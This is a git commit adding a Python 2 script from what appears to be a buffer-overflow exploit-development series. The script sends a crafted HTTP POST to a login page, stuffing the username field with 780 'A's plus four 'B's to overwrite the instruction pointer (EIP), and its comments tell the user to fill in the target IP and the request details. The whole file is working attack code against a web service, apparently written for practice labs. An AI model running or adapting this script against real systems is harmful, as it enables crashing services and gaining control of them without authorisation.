7a1dd249b8bf5fc9eb5cb03512d9322357e66d3c
Josh Giddings <75488156+giddings32@users.noreply.github.com>
2022-08-08 09:40:37 -0400

    Create 5_badchars.py

---
+++ Buffer_Overflow/App_Web_Portal/5_badchars.py
@@ -0,0 +1,39 @@
+#!/usr/bin/python2
+import sys, socket
+
+# Change shellcode to Offset defined above on line 11
+# Replace Buffer Post request details with Wireshark or BurpSuite Post Request details lines 15-23
+# Changes IP Address on lines 16,20,30
+
+try:
+  print "\nOverwriting EIP..."
+
+  shellcode = "A" * 780 + "B" * 4
+  
+  content = "username=" + shellcode + "&password=A"
+
+  buffer = "POST /login HTTP/1.1\r\n"
+  buffer += "Host: x.x.x.x\r\n"
+  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+  buffer += "Referer: http://x.x.x.x/login\r\n"
+  buffer += "Connection: close\r\n"
+  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+  buffer += "Content-Length: "+str(len(content))+"\r\n"
+  buffer += "\r\n"
+  
+  buffer += content
+
+  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+  
+  s.connect(("x.x.x.x", 80))
+  s.send(buffer)
+  
+  s.close()
+  
+  print "\nDone!"
+  
+except:
+  print "\nError Connecting to Server"
+  sys.exit()
